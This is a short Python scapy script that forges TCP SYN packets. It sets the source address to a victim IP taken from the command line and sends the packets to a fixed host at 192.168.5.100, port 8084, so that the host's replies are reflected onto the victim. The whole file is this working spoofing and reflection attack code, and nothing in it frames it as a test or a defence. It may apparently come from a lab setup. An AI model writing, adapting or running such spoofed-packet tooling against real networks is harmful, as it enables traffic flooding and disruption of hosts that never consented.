import scapy.all as scapy
import numpy as np
import sys
import random
import logging
from time import sleep


def main(target_ip):
    packets = []

    syn_packets_number = 5
    syn_ports = np.random.default_rng().choice([x for x in range(49151, 65535)], syn_packets_number, replace=False)

    # Creates the spoofed SYN packets
    for port in syn_ports:
        packet = scapy.IP(dst="192.168.5.100", src=target_ip)/scapy.TCP(dport=8084, sport=port, flags="S")
        packets.append(packet)

    #scapy.sr1(packets[0], timeout=0)
    #sleep(1)
    scapy.sr(packets, timeout=0)


if __name__ == "__main__":
    target_ip = sys.argv[1]


    main(target_ip)
